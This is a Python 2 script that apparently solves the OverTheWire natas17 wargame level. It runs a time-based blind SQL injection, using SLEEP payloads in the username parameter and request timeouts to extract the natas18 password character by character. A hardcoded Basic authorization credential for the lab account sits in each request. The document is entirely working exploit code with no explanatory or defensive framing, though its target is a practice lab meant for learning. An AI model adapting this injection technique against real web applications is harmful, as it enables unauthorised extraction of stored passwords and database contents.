import urllib2
alphanumericChars='1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
passwordChars=''
password=''
debug=0
targetURL='http://natas17.natas.labs.overthewire.org/'
REQ=urllib2.Request(targetURL, headers={"Authorization" : "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="})
try:
    contents = urllib2.urlopen(REQ).read()
    if debug:
        print contents
except urllib2.HTTPError as e:
        print e.code
        print e.read()
def findPassChars():
    global debug, passwordChars, targetURL, passString
    for c in alphanumericChars:
        completeURL=targetURL+'?debug='+ str(debug) +'&username=natas18"+and+password+like+BINARY+"%'+c+'%"+AND+SLEEP(5)=0+AND+"X"="X'
        try:
            REQ=urllib2.Request(completeURL, headers={"Authorization" : "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="})
            contents = urllib2.urlopen(REQ, timeout=1.0).read()
        except IOError as e: 
            passwordChars+= c
            print 'Password contains character     :    ' + c 
                         
def findPassword():
    global debug, passwordChars, targetURL, password
    for i in range(32):
        for c in passwordChars:
            completeURL=targetURL+'?debug='+ str(debug) +'&username=natas18"+and+password+like+BINARY+"'+password+c+'%"+AND+SLEEP(5)=0+AND+"X"="X'
            print completeURL
            try: 
                REQ=urllib2.Request(completeURL, headers={"Authorization" : "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="})
                contents = urllib2.urlopen(REQ, timeout=1.0).read()
            except IOError as e:
                if debug:
                    print contents
                password += c
                print 'Current password evaluation:' + password
                break
    print password

#Find characters in the password
findPassChars()

#Find password based on the characters found using findPassChars()
findPassword()